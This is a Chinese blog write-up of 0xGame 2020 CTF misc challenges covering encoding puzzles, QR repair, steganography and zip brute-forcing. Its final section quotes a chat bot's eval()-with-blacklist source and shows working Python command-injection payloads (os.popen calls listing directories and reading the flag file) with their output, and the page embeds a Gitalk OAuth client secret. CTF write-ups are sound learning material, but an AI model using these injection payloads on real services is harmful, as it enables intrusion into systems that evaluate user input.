<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />

    

    

    <title>0xGame-misc wp | 雨霖铃</title>
    <meta name="author" content="R4iny13lueB311" />
    <meta name="keywords" content="" />
    <meta name="description" content="…week1签到题查看rules可以得到flag10xGame&amp;#123;Welc0m_to_0xGame2020&amp;#125;easyBase一眼看出base64加密，base16 解密即可QR_repairqq截图两张不全的二维码，用美图秀秀拼在一起，百度找一张二维码角的图片贴上去，再用微信扫码即可lowerBase64每四个字符一组穷举改大小写解出官方wp：Base64会把原文的3个字节为一组，一共是24bits，6bits一组重组为4个新的字符。所以我们爆破时需要以4个一组，枚举所有字母大" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />

    
    <link rel="alternate" href="/atom.xml" title="雨霖铃" type="application/atom+xml">
    
    
    <link rel="icon" href="/images/favicon.ico">
    

    <style type="text/css">
    @font-face {
        font-family: 'icomoon';
        src: url("/fonts/icomoon.eot?q628ml");
        src: url("/fonts/icomoon.eot?q628ml#iefix") format('embedded-opentype'),
             url("/fonts/icomoon.ttf?q628ml") format('truetype'),
             url("/fonts/icomoon.woff?q628ml") format('woff'),
             url("/fonts/icomoon.svg?q628ml#icomoon") format('svg');
        font-weight: normal;
        font-style: normal;
    }
    </style>
    
<link rel="stylesheet" href="/css/style.css">


    <!--[if lt IE 9]><style type="text/css">.nav-inner {top:0;}.author-meta {position:static;top:0;}.search-form {height:36px;}</style><script type="text/javascript" src="https://unpkg.com/html5shiv@3.7.3/dist/html5shiv.min.js"></script><![endif]-->
<meta name="generator" content="Hexo 7.0.0"></head>
<body>

    <main class="app">
        <header id="header" class="header clearfix">
    <div id="nav" class="nav">
    <div class="nav-mobile">
        <button id="open-panel" class="open-panel nav-mobile-item"><i class="icon-documents"></i></button>
        <h1 class="nav-mobile-title nav-mobile-item">雨霖铃</h1>
        <button id="open-menus" class="open-panel nav-mobile-item"><i class="icon-library"></i></button>
    </div>

    <nav id="nav-inner" class="nav-inner">
        
            <a class="nav-item" href="/">
                <span class="nav-text">首页</span>
            </a>
        
            <a class="nav-item" href="/tags/CTF">
                <span class="nav-text">CTF</span>
            </a>
        
            <a class="nav-item" href="/tags/PTE">
                <span class="nav-text">渗透</span>
            </a>
        
            <a class="nav-item" href="/tags/tech">
                <span class="nav-text">技术力</span>
            </a>
        
            <a class="nav-item" href="/archives">
                <span class="nav-text">归档</span>
            </a>
        
            <a class="nav-item" href="/about">
                <span class="nav-text">关于</span>
            </a>
        
    </nav>
</div>

    <aside id="aside" class="aside">
    <div id="aside-mask" class="aside-mask"></div>
    <div id="aside-inner" class="aside-inner">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="https://www.ayanagi.fun"></form>

        
        
        
        

        
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#week1"><span class="toc-number">1.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyBase"><span class="toc-number">1.2.</span> <span class="toc-text">easyBase</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QR-repair"><span class="toc-number">1.3.</span> <span class="toc-text">QR_repair</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lowerBase64"><span class="toc-number">1.4.</span> <span class="toc-text">lowerBase64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pcap"><span class="toc-number">1.5.</span> <span class="toc-text">pcap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#week2"><span class="toc-number">2.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Differentpic"><span class="toc-number">2.1.</span> <span class="toc-text">Differentpic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extract"><span class="toc-number">2.2.</span> <span class="toc-text">Extract</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#week3"><span class="toc-number">3.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#threeThousand"><span class="toc-number">3.1.</span> <span class="toc-text">threeThousand</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyMisc"><span class="toc-number">3.2.</span> <span class="toc-text">easyMisc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#week4"><span class="toc-number">4.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flip"><span class="toc-number">4.1.</span> <span class="toc-text">flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hex%E9%85%B1"><span class="toc-number">4.2.</span> <span class="toc-text">Hex酱</span></a></li></ol></li></ol>
        
    </div>
</aside>

</header>

        <div id="content" class="content">
            <div id="wrapper" class="wrapper" style="max-width: 800px">
                <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            0xGame-misc wp
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="https://www.ayanagi.fun/2020/11/22/0xGame/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2020-11-22T12:13:28.000Z" itemprop="datePublished">2020-11-22</time>
</a>

            
<div class="article-tag-list">
    <i class="icon-tag vm"></i>
    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
</div>


        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>…</p>
<span id="more"></span>
<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看rules可以得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xGame&#123;Welc0m_to_0xGame2020&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easyBase"><a href="#easyBase" class="headerlink" title="easyBase"></a>easyBase</h2><p>一眼看出base64加密，base16 解密即可</p>
<h2 id="QR-repair"><a href="#QR-repair" class="headerlink" title="QR_repair"></a>QR_repair</h2><p>qq截图两张不全的二维码，用美图秀秀拼在一起，百度找一张二维码角的图片贴上去，再用微信扫码即可</p>
<h2 id="lowerBase64"><a href="#lowerBase64" class="headerlink" title="lowerBase64"></a>lowerBase64</h2><p>每四个字符一组穷举改大小写解出<br>官方wp：<br>Base64会把原文的3个字节为一组，一共是24bits，6bits一组重组为4个新的字符。所以我们爆破时需<br>要以4个一组，枚举所有字母大小写的组合，然后进行解码。<br>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">from</span> itertools <span class="keyword">import</span> product </span><br><span class="line">c = <span class="string">&#x27;mhhnyw1lezviodq1ntkxltmwmditngjlny1hzgi5lwu4m2q1ntcymtblnx0=&#x27;</span> </span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span> </span><br><span class="line">real_data = <span class="string">&quot;&quot;</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">4</span>):</span><br><span class="line">     pos = [] </span><br><span class="line">     <span class="keyword">for</span> char <span class="keyword">in</span> c[i:i+<span class="number">4</span>]: </span><br><span class="line">         pos.append([char.lower(), char.upper()]) </span><br><span class="line">     cases = [<span class="string">&quot;&quot;</span>.join(k) <span class="keyword">for</span> k <span class="keyword">in</span> product(*pos)]</span><br><span class="line">     <span class="keyword">for</span> <span class="keyword">case</span> <span class="keyword">in</span> cases:</span><br><span class="line">          <span class="keyword">if</span> <span class="built_in">all</span>(<span class="built_in">chr</span>(char) <span class="keyword">in</span> table <span class="keyword">for</span> char <span class="keyword">in</span> b64decode(<span class="keyword">case</span>)):</span><br><span class="line">               real_data += <span class="keyword">case</span></span><br><span class="line">               flag += b64decode(<span class="keyword">case</span>) </span><br><span class="line">               <span class="keyword">break</span> </span><br><span class="line"><span class="built_in">print</span>(real_data) </span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure>


<h2 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h2><p>wireshark打开 搜索HTTP POST发现有文件上传，类型为zip，导出HTTP对象为zip，解压得到图片改宽高<br>一个小非预期：binwalk可以直接分离出zip文件</p>
<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="Differentpic"><a href="#Differentpic" class="headerlink" title="Differentpic"></a>Differentpic</h2><p>stegsolve打开image compare模式发现二维码 保存二维码打开更改滤镜扫码得到flag</p>
<h2 id="Extract"><a href="#Extract" class="headerlink" title="Extract"></a>Extract</h2><p>Binwalk解压得到二维码，扫码提示stegpy，搜索stegpy，发现使用方法，使用stegpy对图片解密得到flag</p>
<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="threeThousand"><a href="#threeThousand" class="headerlink" title="threeThousand"></a>threeThousand</h2><p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join, getsize</span><br><span class="line"></span><br><span class="line">fileIndex = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(fileIndex != <span class="number">1</span>):</span><br><span class="line">    fileName = <span class="string">&quot;%d.zip&quot;</span> % fileIndex</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;begining extract: &quot;</span> + fileName)</span><br><span class="line">    f = zipfile.ZipFile(fileName, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f.extractall(pwd = (<span class="string">&#x27;%02d&#x27;</span> % i).encode(<span class="string">&quot;utf-8&quot;</span>), path = <span class="string">r&quot;./&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;pwd = %02d&quot;</span> % i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    os.remove(<span class="string">r&quot;./%s&quot;</span> % fileName)</span><br><span class="line">    fileIndex = fileIndex - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="easyMisc"><a href="#easyMisc" class="headerlink" title="easyMisc"></a>easyMisc</h2><p>按F12发现两行</p>
<p><code>&lt;!--ZWFzeU1pc2MvZmxhZy56aXA=--&gt;</code></p>
<p><code>&lt;!--ZWFzeU1pc2MvcmVjb3JkLndhdg==--&gt;</code></p>
<p>都是base64加密，解密后的结果粘贴补充到地址栏可以得到压缩包和wav，猫猫hint的图用stegpy解密得知从wav里获取压缩包密码(并没有什么意义的hint)，au打开,是DTMF 得到压缩包密码,解压图片使用stegpy解开得flag</p>
<h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="flip"><a href="#flip" class="headerlink" title="flip"></a>flip</h2><p>解压文件夹后au打开pwd.mp3写出摩斯电码，解密，按照题目说法把密码顺序调转打开压缩包，得到txt文件将里面的二进制数逐一逆序后放入JDK，二进制转ascii得到第二个密码，压缩包里隐藏了一张图片需要在kali里binwalk出来，图片已加密，刚好输入第二个密码得到flag图片，扫描二维码可得flag</p>
<h2 id="Hex酱"><a href="#Hex酱" class="headerlink" title="Hex酱"></a>Hex酱</h2><p>不会python 不会做，唯一一个没出来的misc题<br>官方wp：<br>其实是一道web题<br>源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line">wrong_msg = [<span class="string">&quot;我可运行不了这种呀&quot;</span>,<span class="string">&quot;不支持这么写啦&quot;</span>, <span class="string">&quot;看不懂这种呀&quot;</span>, <span class="string">&quot;哎呀，没有运行成功~&quot;</span>] </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keyword_filter</span>(<span class="params">keyword, msg</span>): </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyword: </span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> msg: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span> <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">py_filter</span>(<span class="params">msg</span>): </span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> [<span class="string">&quot;class&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;listdir&quot;</span>, <span class="string">&quot;help&quot;</span>,<span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;shutdown&quot;</span>, <span class="string">&quot;del&quot;</span>, <span class="string">&quot;logoff&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;globals&quot;</span>, <span class="string">&quot;builtins&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;pow&quot;</span>]: </span><br><span class="line">        <span class="keyword">if</span> keyword_filter(keyword, msg): </span><br><span class="line">            <span class="keyword">return</span> [<span class="literal">False</span>, keyword] </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;**&quot;</span> <span class="keyword">in</span> msg: </span><br><span class="line">            <span class="keyword">return</span> [<span class="literal">False</span>,<span class="string">&quot;**&quot;</span>] </span><br><span class="line">    <span class="keyword">return</span> [<span class="literal">True</span>] </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_python</span>(<span class="params">msg</span>): </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg = msg[<span class="number">6</span>:-<span class="number">1</span>] </span><br><span class="line">        <span class="built_in">print</span>(msg) </span><br><span class="line">        key_word = py_filter(msg) </span><br><span class="line">        <span class="keyword">if</span> key_word[<span class="number">0</span>]: </span><br><span class="line">            temp = <span class="built_in">eval</span>(msg) </span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">return</span> <span class="string">&quot;包含关键词：&quot;</span>+key_word[<span class="number">1</span>] </span><br><span class="line">            <span class="keyword">if</span> temp != <span class="literal">None</span>: </span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">str</span>(temp) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> random.choice(wrong_msg) </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            <span class="keyword">return</span> random.choice(wrong_msg) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcode</span>(<span class="params">msg</span>): </span><br><span class="line">    <span class="keyword">if</span> msg[:<span class="number">6</span>] == <span class="string">&quot;print(&quot;</span> <span class="keyword">and</span> msg[-<span class="number">1</span>] == <span class="string">&quot;)&quot;</span>: </span><br><span class="line">        <span class="keyword">return</span> [<span class="literal">True</span>, do_python(msg)] </span><br><span class="line">    <span class="keyword">if</span> (msg[:<span class="number">4</span>] == <span class="string">&quot;md5(&quot;</span> <span class="keyword">or</span> msg[:<span class="number">4</span>] == <span class="string">&quot;MD5(&quot;</span>) <span class="keyword">and</span> msg[-<span class="number">1</span>] == <span class="string">&quot;)&quot;</span>: </span><br><span class="line">        <span class="keyword">return</span> [<span class="literal">True</span>, hashlib.md5(msg[<span class="number">4</span>:-<span class="number">1</span>].encode()).hexdigest()] </span><br><span class="line">    <span class="keyword">if</span> (msg[:<span class="number">7</span>] == <span class="string">&quot;sha256(&quot;</span> <span class="keyword">or</span> msg[:<span class="number">7</span>] == <span class="string">&quot;SHA256(&quot;</span>) <span class="keyword">and</span> msg[-<span class="number">1</span>] == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">         <span class="keyword">return</span> [<span class="literal">True</span>, hashlib.sha256(msg[<span class="number">7</span>:-<span class="number">1</span>].encode()).hexdigest()]</span><br><span class="line">    <span class="keyword">if</span> (msg[:<span class="number">7</span>] == <span class="string">&quot;sha512(&quot;</span> <span class="keyword">or</span> msg[:<span class="number">7</span>] == <span class="string">&quot;SHA512(&quot;</span>) <span class="keyword">and</span> msg[-<span class="number">1</span>] == <span class="string">&quot;)&quot;</span>: </span><br><span class="line">        <span class="keyword">return</span> [<span class="literal">True</span>, hashlib.sha512(msg[<span class="number">7</span>:-<span class="number">1</span>].encode()).hexdigest()]</span><br><span class="line">    <span class="keyword">if</span> msg[:<span class="number">10</span>] == <span class="string">&quot;b64encode(&quot;</span> <span class="keyword">and</span> msg[-<span class="number">1</span>] == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">         <span class="keyword">return</span> [<span class="literal">True</span>, base64.b64encode(msg[<span class="number">10</span>:-<span class="number">1</span>].encode()).decode()] </span><br><span class="line">    <span class="keyword">if</span> msg[:<span class="number">10</span>] == <span class="string">&quot;b64decode(&quot;</span> <span class="keyword">and</span> msg[-<span class="number">1</span>] == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="literal">True</span>, base64.b64decode(msg[<span class="number">10</span>:-<span class="number">1</span>]).decode()] </span><br><span class="line"><span class="keyword">return</span> [<span class="literal">None</span>]</span><br></pre></td></tr></table></figure>
<p>就是调用eval执行python代码，绕过黑名单过滤进行一个python命令注入就可以拿到flag<br>黑名单是只要出现了某个关键词中的所有字符就会过滤<br>其实过滤没起什么作用，看起来过滤了很多，但是 import os 没过滤<br>windows下对大小写不敏感，全大写就行，所以拿flag的姿势非常多<br>二进制编码也行<br>最简单的使用os库执行系统命令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;WHOAMI&#x27;</span>).read())</span><br><span class="line">izozp2s3d5jnzaz\administrator</span><br></pre></td></tr></table></figure>


<p>列当前目录文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;DIR&#x27;</span>).read()) </span><br><span class="line"><span class="number">2020</span>/<span class="number">11</span>/03 <span class="number">15</span>:<span class="number">52</span> &lt;DIR&gt; . </span><br><span class="line"><span class="number">2020</span>/<span class="number">11</span>/03 <span class="number">15</span>:<span class="number">52</span> &lt;DIR&gt; .. </span><br><span class="line"><span class="number">2020</span>/08/<span class="number">11</span> <span class="number">11</span>:<span class="number">39</span> &lt;DIR&gt; app </span><br><span class="line"><span class="number">2020</span>/08/<span class="number">11</span> <span class="number">11</span>:<span class="number">39</span> &lt;DIR&gt; conf </span><br><span class="line"><span class="number">2020</span>/08/<span class="number">11</span> <span class="number">11</span>:<span class="number">39</span> &lt;DIR&gt; data </span><br><span class="line"><span class="number">2020</span>/09/<span class="number">24</span> <span class="number">16</span>:<span class="number">23</span> &lt;DIR&gt; go-cqhttp </span><br><span class="line"><span class="number">2020</span>/08/<span class="number">11</span> <span class="number">11</span>:<span class="number">39</span> &lt;DIR&gt; httpapi </span><br><span class="line"><span class="number">2020</span>/09/<span class="number">22</span> <span class="number">20</span>:<span class="number">38</span> <span class="number">1</span>,<span class="number">312</span> main_bot.py </span><br><span class="line"><span class="number">2020</span>/09/<span class="number">18</span> 01:<span class="number">20</span> <span class="number">1</span>,<span class="number">813</span> massage_filter.py </span><br><span class="line"><span class="number">2020</span>/<span class="number">11</span>/03 <span class="number">15</span>:<span class="number">52</span> <span class="number">1</span>,<span class="number">850</span> runcode.py </span><br><span class="line"><span class="number">2020</span>/09/<span class="number">18</span> 01:<span class="number">20</span> &lt;DIR&gt; __pycache__</span><br></pre></td></tr></table></figure>

<p>查看当前路径：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;CD&#x27;</span>).read()) </span><br><span class="line">C:\Users\Administrator\Desktop\Game\HexQBot</span><br></pre></td></tr></table></figure>
<p>查看上一级目录：   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;DIR ..\\&#x27;</span>).read()) </span><br><span class="line"><span class="number">2020</span>/09/<span class="number">30</span> <span class="number">00</span>:<span class="number">33</span> &lt;DIR&gt; . </span><br><span class="line"><span class="number">2020</span>/09/<span class="number">30</span> <span class="number">00</span>:<span class="number">33</span> &lt;DIR&gt; .. </span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">00</span>:<span class="number">13</span> &lt;DIR&gt; HexQBot </span><br><span class="line"><span class="number">2020</span>/09/<span class="number">30</span> <span class="number">00</span>:<span class="number">33</span> <span class="number">9</span>,<span class="number">440</span>,<span class="number">520</span> HexQBot.<span class="built_in">zip</span> </span><br><span class="line"><span class="number">2020</span>/09/<span class="number">30</span> <span class="number">00</span>:<span class="number">33</span> &lt;DIR&gt; __MACOSX</span><br></pre></td></tr></table></figure>
<p>查看桌面文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#有时候qq会因为消息长度限制导致无回显，dir命令加个/b就好了 #一般windows题，flag经常在桌面上 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;DIR /B ..\\..\\&#x27;</span>).read())</span><br><span class="line">或者</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;DIR /B %USERPROFILE%\\DESKTOP&#x27;</span>).read()) </span><br><span class="line">或者</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;DIR /B C:\\USERS\\ADMINISTRATOR\\DESKTOP&#x27;</span>).read()) </span><br><span class="line">BtSoft.exe</span><br><span class="line">Game </span><br><span class="line">go-cqhttp-v0<span class="number">.9</span><span class="number">.17</span>-windows-amd64.<span class="built_in">zip</span> </span><br><span class="line">Google Chrome.lnk </span><br><span class="line">here_is_flag.txt </span><br><span class="line">HexQBot </span><br><span class="line">HexQBot - 副本 </span><br><span class="line">HexQBot - 副本.<span class="built_in">zip</span> </span><br><span class="line">jdk-<span class="number">14.0</span><span class="number">.2</span>_windows-x64_bin.exe </span><br><span class="line">Mirai整合包Dice+铃心<span class="number">564</span> </span><br><span class="line">Mirai整合包Dice+铃心<span class="number">564.</span><span class="built_in">zip</span> </span><br><span class="line">pycryptodome-<span class="number">3.9</span><span class="number">.8</span>-cp36-cp36m-win_amd64.whl </span><br><span class="line">python-<span class="number">3.7</span><span class="number">.6</span>-amd64.exe </span><br><span class="line">task </span><br><span class="line">Visual Studio Code.lnk yafu-<span class="number">1.34</span> </span><br><span class="line">yafu-<span class="number">1.34</span>.<span class="built_in">zip</span> </span><br><span class="line">宝塔面板.lnk</span><br></pre></td></tr></table></figure>
<p>在桌面看到flag文件： here_is_flag.txt<br>查看flag：<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;TYPE %USERPROFILE%\\DESKTOP\\HERE_IS_FLAG.TXT&#x27;</span>).read()) 或者使用通配符?： </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;TYPE %USERPROFILE%\\DESKTOP\\????_?? _????.???&#x27;</span>).read()) </span><br><span class="line">或者*： </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;TYPE %USERPROFILE%\\DESKTOP\\HER*&#x27;</span>).read()) </span><br><span class="line"><span class="comment">#0xGame&#123;621a9c2d-0f24-40fc-b5e2-8d8018e5165b&#125;</span></span><br></pre></td></tr></table></figure><br>下次出windows题可能把flag放在内网服务了，搞一个域渗透？</p>

        
    </section>
</article>



<div class="comments">
    <div id="comments"></div>
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
    new Gitalk({
        clientID: "8db4b4a89548994388e9",
        clientSecret: "83900737a29fd1d7795db259d911ae2deba58908",
        repo: "linyuqi9.github.io",
        owner: "linyuqi9",
        admin: ["linyuqi9"],
        id: "0f1a810c2fcaac6238b876199f40525d",
        distractionFreeMode: true,
        title: "0xGame-misc wp",
        body: "https://www.ayanagi.fun/2020/11/22/0xGame/",
        labels: ["CTF"]
    }).render('comments');
    </script>
</div>



            </div>
        </div>

        
            
            <a id="pagenext" href="/2020/11/22/BUUCTF/" class="article-next" title="BUUCTF-misc wp"><i class="icon-arrow-right"></i></a>
            
            
            <a id="pageprev" href="/2020/11/22/Python/" class="article-prev" title="Python类库学习-Pillow"><i class="icon-arrow-left"></i></a>
            
        

        <footer class="footer">
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>

    
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?3f0e368eb1f22fb5a593be6193301ba9";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
    
</footer>
